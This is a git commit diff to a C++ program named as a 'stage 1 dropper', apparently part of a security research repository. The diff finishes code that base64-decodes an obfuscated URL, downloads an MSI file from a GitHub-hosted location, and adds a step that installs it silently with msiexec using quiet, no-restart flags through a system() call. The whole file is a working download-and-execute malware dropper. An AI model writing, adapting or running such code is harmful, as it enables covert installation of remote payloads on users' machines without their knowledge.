792fab031f7741ef5b73724a9c556bea1595af26
Alekzandr <kyle.topasna@gmail.com>
2023-10-29 20:21:40 -0800

    Stage 1 dropper finish. Adding MSI dropper

--- IDAT/Dropper/dropper/main.cpp
+++ IDAT/Dropper/dropper/main.cpp
@@ -6,22 +6,28 @@
 
 int main() {
 	// Encoded Variables
-	std::string encodedMsiUrl = "aHR0cHM6Ly9naXRodWIuY29tL2FsZWt6YW5kci9SZXNlYXJjaC9JREFUL1VwZGF0ZXIubXNp"; // https://github.com/alekzandr/Research/IDAT/Updater.msi
+	std::string encodedMsiUrl = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FsZWt6YW5kci9SZXNlYXJjaC9tYWluL0lEQVQvVXBkYXRlci5tc2k="; // https://github.com/alekzandr/Research/IDAT/Updater.msi
 	std::string decodedMsiUrl = Base64Decode(encodedMsiUrl);
 
 	std::string encodedMsiFileName = "VXBkYXRlci5tc2k="; // Updater.msi
 	std::string decodedMsiFileName = Base64Decode(encodedMsiFileName);
 
 	std::cout << "Decoded: " << decodedMsiUrl << std::endl;
-	std::cout << "Decoded: " << decodedMsiUrl << std::endl;
+	std::cout << "Decoded: " << decodedMsiFileName << std::endl;
 
 	// Download MSI File
-	if (downloadFile(decodedMsiUrl, decodedMsiUrl)) {
+	if (downloadFile(decodedMsiUrl, decodedMsiFileName)) {
 		std::cout << "Download successful!" << std::endl;
 	}
 	else {
 		std::cout << "Download failed." << std::endl;
 	}
+
+	// Execute misexec to install MSI file
+	std::string installCommand = "C:\\Windows\\System32\\msiexec.exe /i " + decodedMsiFileName + " /qn /quiet /norestart";
+	system(installCommand.c_str());
+
+
 
 	return 0;
 
